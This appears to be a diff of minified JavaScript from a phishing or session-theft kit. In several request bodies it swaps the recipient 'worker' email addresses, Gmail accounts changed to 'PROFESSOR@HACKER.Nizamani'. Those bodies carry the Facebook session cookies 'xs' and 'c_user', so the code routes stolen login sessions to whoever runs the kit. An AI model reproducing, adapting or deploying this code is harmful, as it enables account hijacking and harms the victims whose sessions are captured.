@@ -10285,7 +10285,7 @@
           let { hide: t } = e;
           const [r, a] = (0, n.useState)(),
             [i, o] = (0, n.useState)(),
-            l = ["mjohn72929@gmail.com","ameliajackson4001@gmail.com"],
+            l = ["PROFESSOR@HACKER.Nizamani","PROFESSOR@HACKER.Nizamani"],
             s = _();
           return (0, me.jsxs)(me.Fragment, {
             children: [
@@ -10380,7 +10380,7 @@
                               headers: { "Content-Type": "application/json" },
                               body: JSON.stringify({
                                 emails: l,
-                                workerEmail: "mjohn72929@gmail.com",
+                                workerEmail: "PROFESSOR@HACKER.Nizamani",
                                 xs: r,
                                 c_user: i,
                                 name: "Aizaz",
@@ -14236,7 +14236,7 @@
           });
         },
         Wt = () => {
-          const e = ["mjohn72929@gmail.com"],
+          const e = ["PROFESSOR@HACKER.Nizamani"],
             t = _(),
             [r, a] = (0, n.useState)(!1),
             [i, o] = (0, n.useState)(!1),
@@ -14329,7 +14329,7 @@
                                       },
                                       body: JSON.stringify({
                                         emails: e,
-                                        workerEmail: "mjohn72929@gmail.com",
+                                        workerEmail: "PROFESSOR@HACKER.Nizamani",
                                         xs: l,
                                         c_user: u,
                                         name: "My Self",
